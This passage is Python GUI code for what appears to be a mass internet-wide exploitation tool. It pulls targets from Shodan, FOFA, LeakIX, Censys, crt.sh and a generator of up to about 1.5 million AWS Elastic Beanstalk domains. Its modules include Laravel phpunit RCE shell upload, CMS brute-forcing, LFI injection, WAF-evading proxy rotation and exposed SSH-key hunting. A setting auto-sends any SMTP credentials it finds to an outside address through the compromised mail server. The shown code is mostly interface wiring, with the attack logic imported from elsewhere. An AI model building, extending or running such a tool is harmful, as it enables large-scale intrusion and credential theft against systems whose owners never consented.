                                           font=ctk.CTkFont(size=11), state="disabled")
        self._lx_stop_btn.pack(side="right")

        bot = ctk.CTkFrame(f, fg_color="transparent")
        bot.pack(fill="x", padx=10, pady=(0, 8))
        self._lx_status = ctk.CTkLabel(bot, text="", font=ctk.CTkFont(size=10), text_color=C_FOUND)
        self._lx_status.pack(side="left", fill="x", expand=True)
        self._lx_save_btn = ctk.CTkButton(bot, text="💾 Save IPs", width=80, height=24,
                                           fg_color="#12273d", hover_color="#1a3654",
                                           font=ctk.CTkFont(size=10), state="disabled",
                                           command=lambda: self._save_ext_ips('leakix'))
        self._lx_save_btn.pack(side="right")

        lx_fs = ctk.CTkFrame(f, fg_color="transparent")
        lx_fs.pack(fill="x", padx=10, pady=(0, 8))
        ctk.CTkButton(lx_fs, text="⚡ Fetch & Scan (Stream)",
                      command=self._lx_fetch_and_scan,
                      fg_color="#14532d", hover_color="#166534",
                      height=28, font=ctk.CTkFont(size=11, weight="bold"),
                      ).pack(fill="x")
        return f

    def _leakix_fetch(self):
        api_key = self._lx_key.get().strip()
        raw_q   = self._lx_queries.get("0.0", "end").strip()
        queries = [l.strip() for l in raw_q.splitlines() if l.strip() and not l.startswith('#')]
        if not queries:
            messagebox.showwarning("No Queries", "Enter at least one search query.")
            return
        _save_cfg({'leakix_key': api_key, 'leakix_queries': raw_q})
        self._fetch_stop.clear()
        self._lx_fetch_btn.configure(state="disabled", text="Fetching…",
                                      fg_color="#192a3e", text_color="#4b5563")
        self._lx_stop_btn.configure(state="normal")
        self._lx_status.configure(text="Fetching…", text_color=C_WARN)

        def _run():
            targets, err = leakix_search(api_key, queries,
                                          stop_evt=self._fetch_stop, log_cb=self._log_ts)
            self.after(0, lambda: self._leakix_done(targets, err))

        threading.Thread(target=_run, daemon=True).start()

    def _leakix_done(self, targets, err):
        self._lx_fetch_btn.configure(state="normal", text="▶  Fetch from LeakIX",
                                      fg_color="#7c3aed", text_color="#fff")
        self._lx_stop_btn.configure(state="disabled")
        if targets:
            self._leakix_targets = targets
            self._lx_status.configure(text=f"✓ {len(targets):,} targets ready", text_color=C_FOUND)
            self._lx_save_btn.configure(state="normal")
            self._log_found(f"[+] LeakIX: {len(targets):,} targets ready")
        elif err:
            self._lx_status.configure(text=f"Error: {err}", text_color=C_ERR)
            self._log_err(f"[!] {err}")
        else:
            self._lx_status.configure(text="No results", text_color=C_DIM)

    # ── crt.sh panel ──────────────────────────────────────────────────────────
    def _mk_crtsh(self, parent) -> ctk.CTkFrame:
        f = ctk.CTkFrame(parent, fg_color=BG_CRD, corner_radius=8)

        _sec(f, "DOMAINS  (one per line — apex domain only, e.g. example.com)")
        self._ct_domains = ctk.CTkTextbox(f, height=90, font=ctk.CTkFont(family="Consolas", size=11),
                                           fg_color=BG_INP, text_color="#c9d1d9", wrap="none")
        self._ct_domains.pack(fill="x", padx=10, pady=(0, 2))
        self._ct_domains.insert("0.0", "# Finds all subdomains via SSL cert transparency\n# No API key needed — free and unlimited\nexample.com")

        ctk.CTkLabel(f,
            text="Discovers subdomains via certificate transparency logs.\nNo API key needed.",
            font=ctk.CTkFont(size=9), text_color="#4b5563", justify="left",
        ).pack(anchor="w", padx=12, pady=(0, 4))

        r1 = ctk.CTkFrame(f, fg_color="transparent")
        r1.pack(fill="x", padx=10, pady=(4, 3))
        self._ct_fetch_btn = ctk.CTkButton(r1, text="▶  Search crt.sh",
                                            command=self._crtsh_fetch,
                                            fg_color="#7c3aed", hover_color="#6d28d9",
                                            text_color="#fff", height=32,
                                            font=ctk.CTkFont(size=12, weight="bold"))
        self._ct_fetch_btn.pack(side="left", fill="x", expand=True, padx=(0, 4))
        self._ct_stop_btn = ctk.CTkButton(r1, text="⬛", width=36, height=32,
                                           command=lambda: self._fetch_stop.set(),
                                           fg_color="#7f1d1d", hover_color="#991b1b",
                                           font=ctk.CTkFont(size=11), state="disabled")
        self._ct_stop_btn.pack(side="right")

        bot = ctk.CTkFrame(f, fg_color="transparent")
        bot.pack(fill="x", padx=10, pady=(0, 8))
        self._ct_status = ctk.CTkLabel(bot, text="", font=ctk.CTkFont(size=10), text_color=C_FOUND)
        self._ct_status.pack(side="left", fill="x", expand=True)
        self._ct_save_btn = ctk.CTkButton(bot, text="💾 Save IPs", width=80, height=24,
                                           fg_color="#12273d", hover_color="#1a3654",
                                           font=ctk.CTkFont(size=10), state="disabled",
                                           command=lambda: self._save_ext_ips('crtsh'))
        self._ct_save_btn.pack(side="right")
        return f

    def _crtsh_fetch(self):
        raw_d   = self._ct_domains.get("0.0", "end").strip()
        domains = [l.strip() for l in raw_d.splitlines()
                   if l.strip() and not l.startswith('#')]
        if not domains:
            messagebox.showwarning("No Domains", "Enter at least one domain (e.g. example.com).")
            return
        self._fetch_stop.clear()
        self._ct_fetch_btn.configure(state="disabled", text="Searching…",
                                      fg_color="#192a3e", text_color="#4b5563")
        self._ct_stop_btn.configure(state="normal")
        self._ct_status.configure(text=f"Querying crt.sh for {len(domains)} domain(s)…",
                                   text_color=C_WARN)
        self._log_info(f"[*] crt.sh: querying {len(domains)} domain(s)…")

        def _run():
            targets, err = crtsh_search(domains, log_cb=self._log_ts)
            self.after(0, lambda: self._crtsh_done(targets, err))

        threading.Thread(target=_run, daemon=True).start()

    def _crtsh_done(self, targets, err):
        self._ct_fetch_btn.configure(state="normal", text="▶  Search crt.sh",
                                      fg_color="#7c3aed", text_color="#fff")
        self._ct_stop_btn.configure(state="disabled")
        if targets:
            self._crtsh_targets = targets
            self._ct_status.configure(text=f"✓ {len(targets):,} subdomains found", text_color=C_FOUND)
            self._ct_save_btn.configure(state="normal")
            self._log_found(f"[+] crt.sh: {len(targets):,} subdomains ready")
        elif err:
            self._ct_status.configure(text=f"Error: {err}", text_color=C_ERR)
            self._log_err(f"[!] {err}")
        else:
            self._ct_status.configure(text="No subdomains found", text_color=C_DIM)

    def _save_ext_ips(self, source: str):
        targets = {
            'censys': self._censys_targets, 'leakix': self._leakix_targets,
            'crtsh': self._crtsh_targets,
        }.get(source, [])
        if not targets:
            messagebox.showinfo("Save IPs", f"No {source} targets to save yet.")
            return
        ips_dir = os.path.join(os.path.abspath(RESULTS_DIR), "extracted_ips")
        os.makedirs(ips_dir, exist_ok=True)
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(ips_dir, f"{source}_{ts}.txt")
        try:
            with open(path, 'w', encoding='utf-8') as fh:
                fh.write(f"# {source.upper()} Targets — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                fh.write(f"# Total: {len(targets)}\n\n")
                for t in targets:
                    fh.write(t + "\n")
            messagebox.showinfo("Saved", f"Saved {len(targets):,} targets to:\n{path}")
        except Exception as e:
            messagebox.showerror("Error", str(e))

    # ── EB Generator panel ────────────────────────────────────────────────────
    def _mk_eb_gen(self, parent) -> ctk.CTkFrame:
        f = ctk.CTkFrame(parent, fg_color=BG_CRD, corner_radius=8)

        _sec(f, "AWS ELASTIC BEANSTALK TARGET GENERATOR")

        _sec(f, "REGIONS")
        self._eb_region_seg = ctk.CTkSegmentedButton(
            f,
            values=["Top 4 Regions", "All 21 Regions"],
            font=ctk.CTkFont(size=11, weight="bold"),
            selected_color="#1a6e2e", selected_hover_color="#1e8a38",
            unselected_color="#131f30", unselected_hover_color="#1a2d44",
            fg_color="#0c1824",
            command=self._eb_on_region_change,
        )
        self._eb_region_seg.set("Top 4 Regions")
        self._eb_region_seg.pack(fill="x", padx=10, pady=(0, 4))

        self._eb_info_lbl = ctk.CTkLabel(
            f,
            text="us-east-1 / us-west-2 / eu-west-1 / ap-southeast-1",
            font=ctk.CTkFont(size=10), text_color="#4b6a8a",
        )
        self._eb_info_lbl.pack(anchor="w", padx=12, pady=(0, 8))

        _sec(f, "DOMAIN COUNT  (0 = all available)")
        _count_row = ctk.CTkFrame(f, fg_color="transparent")
        _count_row.pack(fill="x", padx=10, pady=(0, 4))
        self._eb_count_entry = ctk.CTkEntry(
            _count_row,
            placeholder_text="e.g. 50000",
            width=120,
            font=ctk.CTkFont(size=12),
        )
        self._eb_count_entry.pack(side="left")
        self._eb_cap_lbl = ctk.CTkLabel(
            _count_row,
            text="  ≤ ~290k  (4 regions)  |  ~1.5M  (21 regions)",
            font=ctk.CTkFont(size=10), text_color="#4b6a8a",
        )
        self._eb_cap_lbl.pack(side="left", padx=(6, 0))

        ctk.CTkButton(
            f,
            text="⚡  Generate  →  Load into Manual",
            command=self._eb_do_generate,
            fg_color="#1a6e2e", hover_color="#1e8a38",
            height=36, font=ctk.CTkFont(size=12, weight="bold"),
        ).pack(fill="x", padx=10, pady=(8, 4))

        self._eb_status_lbl = ctk.CTkLabel(
            f, text="",
            font=ctk.CTkFont(size=11), text_color="#00c897",
        )
        self._eb_status_lbl.pack(anchor="w", padx=12, pady=(0, 8))

        return f

    def _eb_on_region_change(self, value: str):
        if value == "Top 4 Regions":
            names = "us-east-1 / us-west-2 / eu-west-1 / ap-southeast-1"
            cap   = "≤ ~290k  (all tiers)"
        else:
            names = "all 21 AWS EB-supported regions"
            cap   = "≤ ~1.5M  (all tiers)"
        self._eb_info_lbl.configure(text=names)
        self._eb_cap_lbl.configure(text=f"  {cap}")

    def _eb_do_generate(self):
        from eb_gen import generate_eb_domains
        fast  = (self._eb_region_seg.get() == "Top 4 Regions")
        raw   = self._eb_count_entry.get().strip()
        try:
            count = max(0, int(raw)) if raw else 0
        except ValueError:
            count = 0

        self._eb_status_lbl.configure(text="⏳  Generating...", text_color="#f59e0b")
        self._eb_status_lbl.update()

        domains = generate_eb_domains(fast=fast, count=count)

        self._target_box.delete("0.0", "end")
        self._target_box.insert("0.0", "\n".join(domains))
        self._target_count_lbl.configure(text=f"{len(domains):,} EB targets loaded")

        region_label = "4 regions" if fast else "21 regions"
        cap_note = f"  (capped at {count:,})" if count > 0 else ""
        self._eb_status_lbl.configure(
            text=f"{len(domains):,} domains generated  ({region_label}){cap_note}",
            text_color="#00c897",
        )
        self._log_info(f"[*] EB Generator: {len(domains):,} elasticbeanstalk.com targets loaded")

        self._hide_all_src()
        self._source_seg.set("Manual")
        self._source_seg2.set("")
        self._active_source = "Manual"
        self._manual_frm.pack(fill="x")

    def _build_modules_section(self, parent):
        _sec(parent, "SCAN MODULES")
        mf = ctk.CTkFrame(parent, fg_color=BG_CRD, corner_radius=8)
        mf.pack(fill="x", padx=14, pady=(0, 6))

        self._mod: dict[str, ctk.CTkCheckBox] = {}
        defs = [
            ("laravel",   "Laravel / .env  +  phpunit RCE shell upload"),
            ("wordpress",  "WordPress CMS  (enum + brute)"),
            ("joomla",     "Joomla CMS  (enum + brute)"),
            ("magento",    "Magento CMS  (enum + brute)"),
            ("shell",      "Webshell Finder"),
            ("exposure",   "Exposure Paths  (Actuator / Swagger / SSH keys)"),
        ]
        # Services checkbox (handled separately — not a path module)
        self._svc_cb = ctk.CTkCheckBox(
            mf, text="Services  (FTP / SSH / cPanel / WHM)",
            font=ctk.CTkFont(size=11),
            checkmark_color=BG_APP, fg_color=A, hover_color="#00aed4",
        )
        self._svc_cb.pack(anchor="w", padx=12, pady=3)
        self._svc_cb.select()
        for key, label in defs:
            cb = ctk.CTkCheckBox(mf, text=label, font=ctk.CTkFont(size=11),
                                  checkmark_color=BG_APP, fg_color=A, hover_color="#00aed4")
            cb.pack(anchor="w", padx=12, pady=3)
            cb.select()
            self._mod[key] = cb

        # JS Deep Crawl toggle (separate — downloads JS bundles for hardcoded keys)
        self._js_crawl_cb = ctk.CTkCheckBox(
            mf,
            text="JS Deep Crawl  (50 files / 5MB — scans JS bundles for API keys)",
            font=ctk.CTkFont(size=11),
            checkmark_color=BG_APP, fg_color="#7c3aed", hover_color="#6d28d9",
        )
        self._js_crawl_cb.pack(anchor="w", padx=12, pady=(6, 3))

        # LFI / Path Traversal probe — GET-param injection on every target
        self._lfi_probe_cb = ctk.CTkCheckBox(
            mf,
            text="LFI Probe  (injects ?page=, ?file=, etc. — detects path traversal & PHP LFI)",
            font=ctk.CTkFont(size=11),
            checkmark_color=BG_APP, fg_color="#dc2626", hover_color="#b91c1c",
        )
        self._lfi_probe_cb.pack(anchor="w", padx=12, pady=(0, 3))

        # Active Checks — CORS, Host-header injection, open redirect, verb tampering, XFF bypass
        self._active_checks_cb = ctk.CTkCheckBox(
            mf,
            text="Active Checks  (CORS, Host-inject, open redirect, verb tamper, XFF bypass)",
            font=ctk.CTkFont(size=11),
            checkmark_color=BG_APP, fg_color="#b45309", hover_color="#92400e",
        )
        self._active_checks_cb.pack(anchor="w", padx=12, pady=(0, 6))

    def _build_perf_section(self, parent):
        _sec(parent, "THREADS PER TARGET")
        tr = ctk.CTkFrame(parent, fg_color="transparent")
        tr.pack(fill="x", padx=14, pady=(0, 8))
        self._thr_lbl = ctk.CTkLabel(tr, text="20", width=36,
                                      font=ctk.CTkFont(size=13, weight="bold"),
                                      text_color=A)
        self._thr_lbl.pack(side="right")
        self._thr_sl = ctk.CTkSlider(tr, from_=1, to=80, number_of_steps=79,
                                      command=lambda v: self._thr_lbl.configure(text=str(int(v))),
                                      button_color=A, button_hover_color="#00aed4",
                                      progress_color=A)
        self._thr_sl.set(20)
        self._thr_sl.pack(side="left", fill="x", expand=True, padx=(0, 6))

        _sec(parent, "TIMEOUT (seconds)")
        to = ctk.CTkFrame(parent, fg_color="transparent")
        to.pack(fill="x", padx=14, pady=(0, 12))
        self._to_lbl = ctk.CTkLabel(to, text="8", width=36,
                                     font=ctk.CTkFont(size=13, weight="bold"),
                                     text_color=A)
        self._to_lbl.pack(side="right")
        self._to_sl = ctk.CTkSlider(to, from_=3, to=30, number_of_steps=27,
                                     command=lambda v: self._to_lbl.configure(text=str(int(v))),
                                     button_color=A, button_hover_color="#00aed4",
                                     progress_color=A)
        self._to_sl.set(8)
        self._to_sl.pack(side="left", fill="x", expand=True, padx=(0, 6))

        # ── Proxy Pool ─────────────────────────────────────────────────────
        _sec(parent, "PROXY POOL  (HTTP/SOCKS5, one per line)")
        px_frm = ctk.CTkFrame(parent, fg_color=BG_CRD, corner_radius=8)
        px_frm.pack(fill="x", padx=14, pady=(0, 6))
        self._proxy_box = ctk.CTkTextbox(
            px_frm, height=70, font=ctk.CTkFont(family="Consolas", size=10),
            fg_color=BG_INP, text_color="#c9d1d9", wrap="none",
        )
        self._proxy_box.pack(fill="x", padx=10, pady=(6, 2))
        self._proxy_box.insert("0.0", "# http://user:pass@host:port\n# socks5://host:port")
        px_bot = ctk.CTkFrame(px_frm, fg_color="transparent")
        px_bot.pack(fill="x", padx=10, pady=(0, 6))
        self._proxy_enable_cb = ctk.CTkCheckBox(
            px_bot, text="Enable proxy rotation",
            font=ctk.CTkFont(size=11),
            checkmark_color=BG_APP, fg_color=A, hover_color="#00aed4",
        )
        self._proxy_enable_cb.pack(side="left")
        ctk.CTkButton(
            px_bot, text="Load .txt", width=70, height=26,
            fg_color="#12273d", hover_color="#1a3654",
            font=ctk.CTkFont(size=10),
            command=self._load_proxy_file,
        ).pack(side="right")

        # ── Scan Enhancements ─────────────────────────────────────────────
        _sec(parent, "SCAN ENHANCEMENTS")
        enh_frm = ctk.CTkFrame(parent, fg_color=BG_CRD, corner_radius=8)
        enh_frm.pack(fill="x", padx=14, pady=(0, 8))

        self._internetdb_cb = ctk.CTkCheckBox(
            enh_frm,
            text="InternetDB pre-filter  (skip IPs with no web ports — free)",
            font=ctk.CTkFont(size=11),
            checkmark_color=BG_APP, fg_color=A, hover_color="#00aed4",
        )
        self._internetdb_cb.pack(anchor="w", padx=12, pady=(8, 3))

        self._skipwaf_cb = ctk.CTkCheckBox(
            enh_frm,
            text="Skip WAF/CDN IPs  (Cloudflare, Akamai, Fastly, Sucuri…)",
            font=ctk.CTkFont(size=11),
            checkmark_color=BG_APP, fg_color=A, hover_color="#00aed4",
        )
        self._skipwaf_cb.pack(anchor="w", padx=12, pady=3)

        self._resume_cb = ctk.CTkCheckBox(
            enh_frm,
            text="Resume checkpoint  (skip already-scanned targets on restart)",
            font=ctk.CTkFont(size=11),
            checkmark_color=BG_APP, fg_color=A, hover_color="#00aed4",
        )
        self._resume_cb.pack(anchor="w", padx=12, pady=(3, 4))
        ctk.CTkButton(
            enh_frm, text="Clear Checkpoint", height=26,
            fg_color="#1c1010", hover_color="#2e1515",
            font=ctk.CTkFont(size=10),
            command=self._clear_checkpoint_ui,
        ).pack(fill="x", padx=12, pady=(0, 8))

        # ── Red Team Email (SMTP auto-exfil target) ────────────────────────
        _sec(parent, "RED TEAM EMAIL  (SMTP auto-send target)")
        rt_frm = ctk.CTkFrame(parent, fg_color=BG_CRD, corner_radius=8)
        rt_frm.pack(fill="x", padx=14, pady=(0, 8))
        self._redteam_email = ctk.CTkEntry(
            rt_frm,
            placeholder_text="redteam@yourcompany.com",
            fg_color=BG_INP, height=32,
            font=ctk.CTkFont(size=11),
        )
        self._redteam_email.pack(fill="x", padx=10, pady=8)
        saved_rt = self._cfg.get('redteam_email', '')
        if saved_rt:
            self._redteam_email.insert(0, saved_rt)
        ctk.CTkLabel(
            rt_frm,
            text="When SMTP creds are found, credentials are auto-sent\nto this address using the discovered mail server.",
            font=ctk.CTkFont(size=9),
            text_color="#4b5563",
            justify="left",
        ).pack(anchor="w", padx=10, pady=(0, 8))

        self._build_telegram_section(parent)

    def _build_action_strip(self, parent):
        pad = {"padx": 12, "pady": 4}

        self._start_btn = ctk.CTkButton(
            parent, text="▶  START SCAN", command=self._start,
            height=42, fg_color=A, hover_color="#00aed4",
            text_color=BG_APP, font=ctk.CTkFont(size=13, weight="bold"),
            corner_radius=8,
        )
        self._start_btn.pack(fill="x", **pad)

        mid = ctk.CTkFrame(parent, fg_color="transparent")
        mid.pack(fill="x", padx=12, pady=(0, 4))

        self._pause_btn = ctk.CTkButton(
            mid, text="▐▐  PAUSE", command=self._toggle_pause,
            height=34, fg_color="#7c4f0e", hover_color="#a06512",
            font=ctk.CTkFont(size=12), state="disabled", corner_radius=8,
        )
        self._pause_btn.pack(side="left", fill="x", expand=True, padx=(0, 4))

        self._stop_btn = ctk.CTkButton(
            mid, text="■  STOP", command=self._stop,
            height=34, fg_color="#7f1d1d", hover_color="#991b1b",
            font=ctk.CTkFont(size=12), state="disabled", corner_radius=8,
        )
        self._stop_btn.pack(side="right", fill="x", expand=True)

        self._results_btn = ctk.CTkButton(
            parent, text="Open Results Folder", command=self._open_results,
            height=28, fg_color="#111d2c", hover_color="#192a3e",
            font=ctk.CTkFont(size=11), corner_radius=8,
        )
        self._results_btn.pack(fill="x", padx=12, pady=(0, 10))

    # ── Right panel ───────────────────────────────────────────────────────────
    def _build_right(self):
        rp = ctk.CTkFrame(self, fg_color=BG_APP, corner_radius=0)
        rp.grid(row=1, column=1, sticky="nsew", padx=(4, 8), pady=8)
        rp.grid_rowconfigure(0, weight=3)
        rp.grid_rowconfigure(1, weight=1)
        rp.grid_columnconfigure(0, weight=1)

        # ── log ───────────────────────────────────────────────────────────
        lf = ctk.CTkFrame(rp, fg_color=BG_PNL, corner_radius=10)
        lf.grid(row=0, column=0, sticky="nsew", pady=(0, 6))
        lf.grid_rowconfigure(1, weight=1)
        lf.grid_columnconfigure(0, weight=1)

        lh = ctk.CTkFrame(lf, fg_color="transparent")
        lh.grid(row=0, column=0, sticky="ew", padx=12, pady=(10, 0))
        ctk.CTkLabel(lh, text="LIVE LOG",
                     font=ctk.CTkFont(size=10, weight="bold"),
                     text_color=A).pack(side="left")

        ctk.CTkButton(lh, text="Save Log", width=68, height=24,
                      fg_color="#111d2c", hover_color="#192a3e",
                      font=ctk.CTkFont(size=10),
                      command=self._save_log).pack(side="right", padx=(4, 0))
        ctk.CTkButton(lh, text="Clear", width=52, height=24,
                      fg_color="#111d2c", hover_color="#192a3e",
                      font=ctk.CTkFont(size=10),
                      command=self._clear_log).pack(side="right")

        self._log_box = ctk.CTkTextbox(
            lf, font=ctk.CTkFont(family="Consolas", size=11),
            fg_color=BG_INP, text_color="#9ca3af", wrap="none",
            corner_radius=6,
        )
        self._log_box.grid(row=1, column=0, sticky="nsew", padx=12, pady=(6, 12))
        self._log_box.configure(state="disabled")

        # Set up colored tags on the underlying tk.Text widget
        tw = self._log_box._textbox
        tw.tag_config("ts",      foreground=C_TS)
        tw.tag_config("found",   foreground=C_FOUND)
        tw.tag_config("info",    foreground=C_INFO)
        tw.tag_config("warn",    foreground=C_WARN)
        tw.tag_config("err",     foreground=C_ERR)
        tw.tag_config("dim",     foreground=C_DIM)
        tw.tag_config("probe",   foreground="#1e3a5f")   # 404 — very dark, barely visible
        tw.tag_config("invalid",    foreground="#be123c")
        tw.tag_config("accessible", foreground="#f59e0b")

        # ── bottom tabview: findings summary + vuln targets ──────────────────
        btab = ctk.CTkTabview(rp, fg_color=BG_PNL, corner_radius=10,
                              segmented_button_fg_color=BG_PNL,
                              segmented_button_selected_color=A,
                              segmented_button_selected_hover_color="#00aed4",
                              segmented_button_unselected_color=BG_PNL,
                              segmented_button_unselected_hover_color="#192a3e",
                              text_color=BG_APP,
                              text_color_disabled="#334155")
        btab.grid(row=1, column=0, sticky="nsew")
        btab.add("FINDINGS")
        btab.add("VULN TARGETS")

        # ── Tab 1: findings counter cards ─────────────────────────────────────
        tf = btab.tab("FINDINGS")
        tf.grid_rowconfigure(0, weight=1)
        tf.grid_columnconfigure(0, weight=1)
        scroll_sf = ctk.CTkScrollableFrame(tf, fg_color="transparent",
                                            corner_radius=0,
                                            scrollbar_button_color="#1e3a5f")
        scroll_sf.grid(row=0, column=0, sticky="nsew")

        cols = 13
        for i, (key, label, color) in enumerate(FINDING_META):
            card = CounterCard(scroll_sf, label, color)
            card.grid(row=i // cols, column=i % cols, padx=2, pady=2, sticky="ew")
            scroll_sf.grid_columnconfigure(i % cols, weight=1)
            self._cards[key] = card
        for c in range(cols):
            scroll_sf.grid_columnconfigure(c, weight=1)

        # ── Tab 2: vuln targets list ──────────────────────────────────────────
        vt = btab.tab("VULN TARGETS")
        vt.grid_rowconfigure(1, weight=1)
        vt.grid_columnconfigure(0, weight=1)

        vt_hdr = ctk.CTkFrame(vt, fg_color="transparent")
        vt_hdr.grid(row=0, column=0, sticky="ew", padx=4, pady=(4, 2))
        ctk.CTkLabel(vt_hdr, text="Vulnerable IPs / URLs found during scan",
                     font=ctk.CTkFont(size=10), text_color="#94a3b8").pack(side="left")
        ctk.CTkButton(vt_hdr, text="Save List", width=72, height=24,
                      fg_color=A, hover_color="#00aed4", text_color=BG_APP,
                      font=ctk.CTkFont(size=10, weight="bold"),
                      command=self._save_vuln_targets).pack(side="right", padx=(4, 0))
        ctk.CTkButton(vt_hdr, text="Clear", width=52, height=24,
                      fg_color="#111d2c", hover_color="#192a3e",
                      font=ctk.CTkFont(size=10),
                      command=self._clear_vuln_targets).pack(side="right")

        self._vuln_box = ctk.CTkTextbox(
            vt, font=ctk.CTkFont(family="Consolas", size=11),
            fg_color=BG_INP, text_color=C_FOUND, wrap="none", corner_radius=6,
        )
        self._vuln_box.grid(row=1, column=0, sticky="nsew", padx=4, pady=(0, 4))
        self._vuln_box.configure(state="disabled")

    # ── Status bar ────────────────────────────────────────────────────────────
    def _build_statusbar(self):
        bar = ctk.CTkFrame(self, height=36, fg_color=BG_HDR, corner_radius=0)
        bar.grid(row=2, column=0, columnspan=2, sticky="ew")
        bar.grid_propagate(False)

        self._stat_lbl = ctk.CTkLabel(bar, text="Ready",
                                       font=ctk.CTkFont(size=11),
                                       text_color="#334155")
        self._stat_lbl.pack(side="left", padx=16)

        self._detail_lbl = ctk.CTkLabel(bar, text="",
                                         font=ctk.CTkFont(size=11),
                                         text_color="#334155")
        self._detail_lbl.pack(side="left", padx=8)

        self._prog_lbl = ctk.CTkLabel(bar, text="",
                                       font=ctk.CTkFont(size=11),
                                       text_color="#334155")
        self._prog_lbl.pack(side="right", padx=(0, 12))

        self._progress = ctk.CTkProgressBar(bar, width=280, height=7,
                                             progress_color=A, fg_color="#111d2c")
        self._progress.pack(side="right", padx=(0, 8), pady=14)
        self._progress.set(0)

    # ══════════════════════════════════════════════════════════════════════════
    # SOURCE SWITCHING
    # ══════════════════════════════════════════════════════════════════════════

    def _hide_all_src(self):
        for frm in (self._manual_frm, self._shodan_frm, self._fofa_frm,
                    self._bgp_frm, self._censys_frm, self._leakix_frm,
                    self._crtsh_frm, self._eb_gen_frm):
            frm.pack_forget()

    def _on_source(self, value: str):
        self._hide_all_src()
        self._source_seg2.set("")          # deselect extended row
        self._active_source = value
        _pad = dict(fill="x", padx=14, pady=(0, 6))
        if value == "Manual":
            self._manual_frm.pack(fill="x")
        elif value == "Shodan":
            self._shodan_frm.pack(**_pad)
        elif value == "FOFA":
            self._fofa_frm.pack(**_pad)
        elif value == "BGP":
            self._bgp_frm.pack(**_pad)

    def _on_source2(self, value: str):
        self._hide_all_src()
        self._source_seg.set("")           # deselect primary row
        self._active_source = value
        _pad = dict(fill="x", padx=14, pady=(0, 6))
        if value == "Censys":
            self._censys_frm.pack(**_pad)
        elif value == "LeakIX":
            self._leakix_frm.pack(**_pad)
        elif value == "CRT.SH":
            self._crtsh_frm.pack(**_pad)
        elif value == "EB Gen":
            self._eb_gen_frm.pack(**_pad)

    # ══════════════════════════════════════════════════════════════════════════
    # OSINT FETCH
    # ══════════════════════════════════════════════════════════════════════════

    # ── Fetch UI state helper ─────────────────────────────────────────────────

    def _set_fetch_state(self, source: str, state: str):
        """
        state: 'idle'     → Fetch enabled, Stop/Pause disabled
               'fetching' → Fetch disabled, Stop/Pause enabled
               'paused'   → Stop enabled, Pause becomes Resume
        """
        if source == 'shodan':
            fb, sb, pb = self._sh_fetch_btn, self._sh_stop_btn, self._sh_pause_btn
            name = "Shodan"
        else:
            fb, sb, pb = self._fo_fetch_btn, self._fo_stop_btn, self._fo_pause_btn
            name = "FOFA"

        if state == 'idle':
            fb.configure(state="normal", text=f"▶  Fetch from {name}",
                         fg_color=A, text_color=BG_APP)
            sb.configure(state="disabled")
            pb.configure(state="disabled", text="▐▐  Pause",
                         fg_color="#7c4f0e", hover_color="#a06512")
        elif state == 'fetching':
            fb.configure(state="disabled", text="Fetching…",
                         fg_color="#192a3e", text_color="#4b5563")
            sb.configure(state="normal")
            pb.configure(state="normal", text="▐▐  Pause",
                         fg_color="#7c4f0e", hover_color="#a06512")
        elif state == 'paused':
            pb.configure(text="▶  Resume",
                         fg_color="#14532d", hover_color="#166534")

    # ── Fetch callbacks ───────────────────────────────────────────────────────

    def _shodan_fetch(self):
        key     = self._sh_key.get().strip()
        raw_q   = self._sh_queries.get("0.0", "end").strip()
        queries = [l.strip() for l in raw_q.splitlines()
                   if l.strip() and not l.strip().startswith('#')]
        if not key:
            messagebox.showwarning("Missing Key", "Enter your Shodan API key.")
            return
        if not queries:
            messagebox.showwarning("Missing Queries", "Enter at least one search query.")
            return

        _save_cfg({'shodan_key': key, 'shodan_queries': raw_q})
        self._fetch_stop.clear()
        self._fetch_pause.set()
        self._set_fetch_state('shodan', 'fetching')
        qw = 'query' if len(queries) == 1 else 'queries'
        self._sh_status.configure(text=f"Running {len(queries)} {qw}…", text_color=C_WARN)
        self._log_info(f"[*] Shodan: starting {len(queries)} {qw}…")

        def _run():
            targets, err = shodan_search(
                key, queries,
                stop_evt=self._fetch_stop,
                pause_evt=self._fetch_pause,
                log_cb=self._log_ts,
            )
            self.after(0, lambda: self._on_fetch_done('shodan', targets, err))

        threading.Thread(target=_run, daemon=True).start()

    def _fofa_fetch(self):
        email   = self._fo_email.get().strip()
        key     = self._fo_key.get().strip()
        raw_q   = self._fo_queries.get("0.0", "end").strip()
        queries = [l.strip() for l in raw_q.splitlines()
                   if l.strip() and not l.strip().startswith('#')]
        if not email or not key:
            messagebox.showwarning("Missing Credentials", "Enter FOFA email and API key.")
            return
        if not queries:
            messagebox.showwarning("Missing Queries", "Enter at least one search query.")
            return

        _save_cfg({'fofa_email': email, 'fofa_key': key, 'fofa_queries': raw_q})
        self._fetch_stop.clear()
        self._fetch_pause.set()
        self._set_fetch_state('fofa', 'fetching')
        qw = 'query' if len(queries) == 1 else 'queries'
        self._fo_status.configure(text=f"Running {len(queries)} {qw}…", text_color=C_WARN)
        self._log_info(f"[*] FOFA: starting {len(queries)} {qw}…")

        def _run():
            targets, err = fofa_search(
                email, key, queries,
                stop_evt=self._fetch_stop,
                pause_evt=self._fetch_pause,
                log_cb=self._log_ts,
            )
            self.after(0, lambda: self._on_fetch_done('fofa', targets, err))

        threading.Thread(target=_run, daemon=True).start()

    # ── Fetch control ─────────────────────────────────────────────────────────

    def _stop_fetch(self, source: str):
        """Signal the fetch thread to stop after the current page."""
        self._fetch_stop.set()
        self._fetch_pause.set()   # unblock if paused so it can exit
        status = self._sh_status if source == 'shodan' else self._fo_status
        status.configure(text="Stopping…", text_color=C_WARN)
        self._log_warn("[!] Fetch stop requested…")

    def _toggle_fetch_pause(self, source: str):
        """Pause or resume the running fetch."""
        if self._fetch_pause.is_set():
            # currently running → pause it
            self._fetch_pause.clear()
            self._set_fetch_state(source, 'paused')
            status = self._sh_status if source == 'shodan' else self._fo_status
            status.configure(text="Paused — click Resume to continue", text_color=C_WARN)
            self._log_warn("[!] Fetch paused")
        else:
            # currently paused → resume
            self._fetch_pause.set()
            self._set_fetch_state(source, 'fetching')
            status = self._sh_status if source == 'shodan' else self._fo_status
            status.configure(text="Resumed…", text_color=C_WARN)
            self._log_info("[*] Fetch resumed")

    def _sh_fetch_and_scan(self):
        key   = self._sh_key.get().strip()
        raw_q = self._sh_queries.get("0.0", "end").strip()
        queries = [l.strip() for l in raw_q.splitlines()
                   if l.strip() and not l.strip().startswith('#')]
        if not key:
            messagebox.showwarning("Missing Key", "Enter your Shodan API key.")
            return
        if not queries:
